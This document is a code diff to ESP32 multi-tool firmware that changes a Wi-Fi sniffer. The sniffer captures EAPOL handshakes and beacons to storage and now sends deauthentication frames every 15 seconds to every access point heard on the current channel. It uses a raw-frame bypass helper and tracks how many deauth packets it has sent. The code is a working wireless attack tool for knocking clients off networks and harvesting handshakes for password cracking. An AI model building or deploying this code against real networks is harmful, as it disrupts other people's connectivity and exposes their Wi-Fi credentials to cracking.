@@ -39,19 +39,26 @@
 #define FILENAME "raw_"
 #define SAVE_INTERVAL 10     // save new file every 30s
 #define CHANNEL_HOPPING true // if true it will scan on all channels
-#define MAX_CHANNEL 11       //(only necessary if channelHopping is true)
+#define MAX_CHANNEL 12       //(only necessary if channelHopping is true)
 #define HOP_INTERVAL 214     // in ms (only necessary if channelHopping is true)
+#define DEAUTH_INTERVAL (15*1000)  //Send deauth packets every ms
+#define EAPOL_ONLY true
 
 //===== Run-Time variables =====//
 unsigned long lastTime = 0;
 unsigned long lastChannelChange = 0;
+uint32_t lastRedraw = 0;
 uint8_t ch = CHANNEL;
 bool fileOpen = false;
 bool isLittleFS = true;
-bool _only_HS = false; // option to only save handshakes and EAPOL pcaps
+bool _only_HS = EAPOL_ONLY; // option to only save handshakes and EAPOL pcaps
 int num_EAPOL = 0;
 int num_HS = 0;
 uint32_t packet_counter = 0;
+uint32_t deauth_counter = 0;
+uint32_t beacon_frames  = 0;
+uint32_t start_time     = 0;
+long     deauth_tmp = 0;
 
 File _pcap_file;
 std::set<BeaconList> registeredBeacons;
@@ -221,8 +228,10 @@ bool writeHeader(File file) {
 }
 
 /* will be executed on every packet the ESP32 gets while beeing in promiscuous mode */
+// Sniffer callback
 void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
     // If using LittleFS to save .pcaps and there's no room for data, don't do anything whith new packets
+  
     if (isLittleFS && !checkLittleFsSizeNM()) {
         returnToMenu = true;
         esp_wifi_set_promiscuous(false);
@@ -231,26 +240,13 @@ void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
     wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
     wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)pkt->rx_ctrl;
 
-    if (fileOpen && !_only_HS) {
-        uint32_t timestamp = now();                                         // current timestamp
-        uint32_t microseconds = (unsigned int)(micros() - millis() * 1000); // microseconds offset (0 - 999)
-
-        uint32_t len = ctrl.sig_len;
-        if (type == WIFI_PKT_MGMT) {
-            len -= 4; // Need to remove last 4 bytes (for checksum) or packet gets malformed #
-                      // https://github.com/espressif/esp-idf/issues/886
-        }
-        newPacketSD(
-            timestamp, microseconds, len, pkt->payload, _pcap_file
-        ); // If it is to save everything, saves every packet
-    }
-    packet_counter++;
-
     const uint8_t *frame = pkt->payload;
     const uint16_t frameControl = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);
     const uint8_t frameType = (frameControl & 0x0C) >> 2;
     const uint8_t frameSubType = (frameControl & 0xF0) >> 4;
 
+    packet_counter++;
+    
     if (isItEAPOL(pkt)) {
         // if(_only_HS) newPacketSD(timestamp, microseconds, len, pkt->payload, _pcap_file);
         num_EAPOL++;
@@ -264,27 +260,43 @@ void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
         if (isLittleFS) saveHandshake(pkt, false, LittleFS);
         else saveHandshake(pkt, false, SD);
     }
+
+    // Beacon frame
     if (frameType == 0x00 && frameSubType == 0x08) {
-        const uint8_t *senderAddr = frame + 10; // Adresse source dans la trame beacon
+        const uint8_t *senderAddr = frame + 10; // Beacon source address
+	beacon_frames++;
+        
+        pkt->rx_ctrl.sig_len -= 4; // cut off last 4 b
+        // save the packet
+        if(isLittleFS) saveHandshake(pkt, true, LittleFS);
+	else           saveHandshake(pkt, true, SD);
 
-        // Convertir l'adresse MAC en chaîne de caractères pour la comparaison
-        char macStr[18];
-        snprintf(
-            macStr,
-            sizeof(macStr),
-            "%02X:%02X:%02X:%02X:%02X:%02X",
-            senderAddr[0],
-            senderAddr[1],
-            senderAddr[2],
-            senderAddr[3],
-            senderAddr[4],
-            senderAddr[5]
-        );
+	//Save beacon to the list
+	BeaconList ThisBeacon;
+        memcpy(ThisBeacon.MAC, (char *)senderAddr, 6);
+        ThisBeacon.channel = ch;
+	//Check if already registered
+        if (registeredBeacons.find(ThisBeacon) != registeredBeacons.end()) {
+	  return;
+        }
+        registeredBeacons.insert(ThisBeacon); // add to the list
+    }
+    
+    // If we just want handshakes, quit now
+    if(_only_HS) return;
+    
+    if (fileOpen) {
+        uint32_t timestamp = now();                                         // current timestamp
+        uint32_t microseconds = (unsigned int)(micros() - millis() * 1000); // microseconds offset (0 - 999)
 
-        pkt->rx_ctrl.sig_len -= 4; // Réduire la longueur du signal de 4 bytes
-        // Enregistrer le paquet
-        if (isLittleFS) saveHandshake(pkt, true, LittleFS);
-        else saveHandshake(pkt, true, SD);
+        uint32_t len = ctrl.sig_len;
+        if (type == WIFI_PKT_MGMT) {
+            len -= 4; // Remove last 4 bytes (for checksum) or packet gets malformed 
+                      // https://github.com/espressif/esp-idf/issues/886
+        }
+        newPacketSD(
+            timestamp, microseconds, len, pkt->payload, _pcap_file
+		    ); // write packet to sd
     }
 }
 
@@ -334,18 +346,16 @@ void sniffer_setup() {
     FS *Fs;
     int redraw = true;
     String FileSys = "LittleFS";
-    bool deauth = true;
-    long deauth_tmp = 0;
-    drawMainBorderWithTitle("RAW SNIFFER");
-
+    bool deauth = false;
+    start_time = millis();
+    drawMainBorderWithTitle("pcap sniffer");
+    lastRedraw = millis();
     // closeSdCard();
 
-    _only_HS = true; // default mode to start if it doesn't have SD Cadr
     if (setupSdCard()) {
         Fs = &SD; // if SD is present and mounted, start writing on SD Card
         FileSys = "SD";
         isLittleFS = false;
-        _only_HS = false;  // When using SD Card, saves everything
     } else Fs = &LittleFS; // if not, use the internal memory.
 
     openFile(*Fs);
@@ -391,6 +401,8 @@ void sniffer_setup() {
     deauth_tmp = millis();
     // Prepare deauth frame for each AP record
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+    // Main sniffer loop
+
     for (;;) {
         if (returnToMenu) { // if it happpend, liffle FS is full;
             Serial.println("Not enough space on LittleFS");
@@ -431,7 +443,6 @@ void sniffer_setup() {
                     );
                 vTaskDelay(10 / portTICK_RATE_MS);
             }
-            LongPress = false;
             if (millis() - _tmp > 700) { // longpress detected to exit
                 returnToMenu = true;
                 _pcap_file.close();
@@ -442,9 +453,9 @@ void sniffer_setup() {
             esp_wifi_set_promiscuous(false);
             esp_wifi_set_promiscuous_rx_cb(nullptr);
             ch--; // increase channel
-            if (ch < 1) ch = 11;
+            if (ch < 1) ch = MAX_CHANNEL;
             // Serial.println(ch);
-            wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
+            wifi_second_chan_t secondCh = (wifi_second_chan_t) NULL;
             esp_wifi_set_channel(ch, secondCh);
             redraw = true;
             vTaskDelay(50 / portTICK_PERIOD_MS);
@@ -463,9 +474,7 @@ void sniffer_setup() {
         }
 #endif
 
-        if (check(SelPress) || redraw) { // Apertar o botão OK ou ENTER
-            vTaskDelay(200 / portTICK_PERIOD_MS);
-            if (!redraw) {
+	if (check(SelPress)) { // pressed ok - show menu
                 options = {
                     {"New File",
                      [=]() {
@@ -481,60 +490,98 @@ void sniffer_setup() {
                              openFile(*Fs); // open new file
                          }
                      }                                                                          },
-                    {deauth ? "Deauth->OFF" : "Deauth->ON",      [&]() { deauth = !deauth; }    },
+                    {deauth ? "Disable deauth" : "Enable deauth",      [&]() { deauth = !deauth; }    },
                     {_only_HS ? "All packets" : "EAPOL/HS only", [=]() { _only_HS = !_only_HS; }},
-                    {"Reset Counter",
+                    {"Reset Counters",
                      [=]() {
                          packet_counter = 0;
                          num_EAPOL = 0;
                          num_HS = 0;
+			 start_time = millis();
+			 beacon_frames = 0;
+			 registeredBeacons.clear();
+			 deauth_tmp = millis();
+			 
                      }                                                                          },
                     {"Exit Sniffer",                             [=]() { returnToMenu = true; } },
                 };
                 loopOptions(options);
             }
-            if (returnToMenu) goto Exit;
-            redraw = false;
-            tft.drawPixel(0, 0, 0);
-            drawMainBorderWithTitle("RAW SNIFFER"); // Clear Screen and redraw border
-            tft.setTextSize(FP);
-            tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
-            padprintln("Saved file into " + FileSys);
-            padprintln("File: " + filename);
-            padprintln("Sniffer Mode: " + String(_only_HS ? "Only EAPOL/HS" : "All packets Sniff"));
-            padprintln(deauth ? "Deauth: ON" : "Deauth: OFF");
-            padprintln(String(BTN_ALIAS) + ": Options Menu");
-            tft.drawRightString(
-                "Ch." + String(ch < 10 ? "0" : "") + String(ch) + "(Next)", tftWidth - 10, tftHeight - 18, 1
-            );
-        }
+	
+        if (redraw) { // Redraw UI
+	  redraw = false;
 
-        if (currentTime - lastTime > 100) tft.drawPixel(0, 0, 0);
+	  vTaskDelay(200 / portTICK_PERIOD_MS);
+
+	  //calculate run time
+	  uint32_t runtime = (millis() - start_time)/1000;
+	    
+	  if (returnToMenu) goto Exit;
+	  tft.drawPixel(0, 0, 0);
+	  drawMainBorderWithTitle("pcap sniffer"); // Clear Screen and redraw border
+	  tft.setTextSize(FP);
+	  tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+	  padprintln("File: " + FileSys + ":" + filename);
+	  padprintln("Sniffer Mode: " + String(_only_HS ? "Only EAPOL/HS" : "All packets"));
+	  if(deauth){
+	    tft.setTextColor(bruceConfig.bgColor, bruceConfig.priColor);
+	    padprintln(
+		       "Deauth: in " + String((DEAUTH_INTERVAL - (millis() - deauth_tmp))/1000) + "s, total " \
+		       + String(deauth_counter) + " pkts sent");
+	    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
+
+	  } else padprintln("Silent mode.");
+	  padprintln("Run time " + String(runtime/60) + ":" + String(runtime%60));
+	  //padprintln("millis=" + String(millis()));
+	  padprintln("Beacons " + String(beacon_frames) + " tot. /" + String(registeredBeacons.size()) + " in mem.");
+
+	  // make a nice reverse video bar
+	  tft.setTextColor(bruceConfig.bgColor, bruceConfig.priColor);
+	  tft.drawRightString(
+			      "Ch" + String(ch < 10 ? "0" : "") + String(ch) + " (Next)", tftWidth - 10, tftHeight - 18, 1
+			      );
+	  tft.drawString(" EAPOL: " + String(num_EAPOL) + " HS: " + String(num_HS) + " ", 10, tftHeight - 18);
+	  tft.drawCentreString("Packets " + String(packet_counter), tftWidth / 2, tftHeight - 26, 1);
+
+	}
+
+	if (currentTime - lastTime > 100) tft.drawPixel(0, 0, 0);
 
         if (fileOpen && currentTime - lastTime > 1000) {
-            _pcap_file.flush();     // save file
+	  _pcap_file.flush();     // save file
             lastTime = currentTime; // update time
-            tft.drawString("EAPOL: " + String(num_EAPOL) + " HS: " + String(num_HS), 10, tftHeight - 18);
-            tft.drawCentreString("Packets " + String(packet_counter), tftWidth / 2, tftHeight - 26, 1);
+            
         }
 
-        if (deauth && (millis() - deauth_tmp) > 60000) { // deauths once every 60 seconds
+        if (deauth && (millis() - deauth_tmp) > DEAUTH_INTERVAL) {
+	  bool deauth_sent = false;
             if (registeredBeacons.size() > 40)
                 registeredBeacons.clear(); // Clear registered beacons to restart search and avoid restarts
-            // Serial.println("<<---- Starting Deauthentication Process ---->>");
+            Serial.println("<<---- Starting Deauthentication Process ---->>");
             for (auto registeredBeacon : registeredBeacons) {
                 if (registeredBeacon.channel == ch) {
                     memcpy(&ap_record.bssid, registeredBeacon.MAC, 6);
                     wsl_bypasser_send_raw_frame(
                         &ap_record, registeredBeacon.channel
                     ); // writes the buffer with the information
+		    //XXX: ap_record reused between this and wifi_atks.h
                     send_raw_frame(deauth_frame, 26);
+		    deauth_sent = true; deauth_counter++;
                     vTaskDelay(2 / portTICK_RATE_MS);
                 }
             }
+	    if(deauth_sent) tft.drawString("Deauth sent.", 10, tftHeight - 14);
+
             deauth_tmp = millis();
         }
-
+	//TODO: display a count of wifi networks on the selected channel (count registeredBeacons)
+	//TODO: store a last-seen millis value for each beacon, update it whenever its seen, delete beacon after not hearing
+	//TODO: maybe show a list of SSIDs?
+	
+	if(millis() - lastRedraw > 1000) {
+	  redraw = true;
+	  lastRedraw = millis();
+	}
         vTaskDelay(100 / portTICK_PERIOD_MS);
     }
 Exit:
